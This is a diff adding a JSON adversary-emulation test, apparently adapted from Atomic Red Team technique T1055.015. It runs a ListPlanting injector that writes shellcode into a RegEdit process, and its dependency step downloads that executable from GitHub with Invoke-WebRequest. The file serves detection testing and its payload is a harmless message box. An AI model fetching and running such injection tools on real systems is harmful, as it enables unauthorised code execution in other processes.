@@ -1,0 +1,105 @@
+{
+  "id": "4f3c7502-b111-4dfe-8a6e-529307891a59",
+  "name": "Process injection ListPlanting",
+  "description": "This test injects shellcode into a remote RegEdit process using the ListPlanting technique. ListPlanting exploits Window with ListView control. Code write to memory with NtWriteVirtualMemory. The shellcode is executed via PostMessage. When successful, a message box will appear with the title \"Warning\" and the content \"Atomic Red Team\" after a few seconds. Notepad will open following the appearance of the message box.",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "817e6d69-83d8-4fe2-8074-62b24c6e4130",
+      "type": "execute-command",
+      "data": {
+        "command": "Start-Process \"#{exe_binary}\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "9e40e482-b5a6-4194-9867-e27a1cea44dc",
+      "type": "execute-command",
+      "data": {
+        "command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "3419a6df-674d-42cd-948e-90a2ba0cb20e",
+      "name": "Check dependency 1/1",
+      "description": "Injector ListPlanting.exe must exist at specified location (#{exe_binary})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{exe_binary}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "6456253e-a427-4780-b507-20825afe84ef",
+      "name": "Resolve dependency 1/1",
+      "description": "Injector ListPlanting.exe must exist at specified location (#{exe_binary})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path \"#{exe_binary}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.015/bin/ListPlanting.exe\" -OutFile \"#{exe_binary}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "1e7e7b35-1cb2-45f8-8641-e1c3f3d23d5b",
+      "name": "Re-check dependency 1/1",
+      "description": "Injector ListPlanting.exe must exist at specified location (#{exe_binary})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{exe_binary}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "817e6d69-83d8-4fe2-8074-62b24c6e4130",
+      "p": "on-success",
+      "o": "9e40e482-b5a6-4194-9867-e27a1cea44dc"
+    },
+    {
+      "s": "817e6d69-83d8-4fe2-8074-62b24c6e4130",
+      "p": "on-failure",
+      "o": "9e40e482-b5a6-4194-9867-e27a1cea44dc"
+    },
+    {
+      "s": "3419a6df-674d-42cd-948e-90a2ba0cb20e",
+      "p": "on-success",
+      "o": "817e6d69-83d8-4fe2-8074-62b24c6e4130"
+    },
+    {
+      "s": "3419a6df-674d-42cd-948e-90a2ba0cb20e",
+      "p": "on-failure",
+      "o": "6456253e-a427-4780-b507-20825afe84ef"
+    },
+    {
+      "s": "6456253e-a427-4780-b507-20825afe84ef",
+      "p": "on-success",
+      "o": "1e7e7b35-1cb2-45f8-8641-e1c3f3d23d5b"
+    },
+    {
+      "s": "1e7e7b35-1cb2-45f8-8641-e1c3f3d23d5b",
+      "p": "on-failure",
+      "o": "817e6d69-83d8-4fe2-8074-62b24c6e4130"
+    }
+  ],
+  "tags": [
+    "T1055.015",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "exe_binary",
+      "type": "path",
+      "description": "PE binary",
+      "value": "PathToAtomicsFolder\\T1055.015\\bin\\ListPlanting.exe"
+    }
+  ]
+}
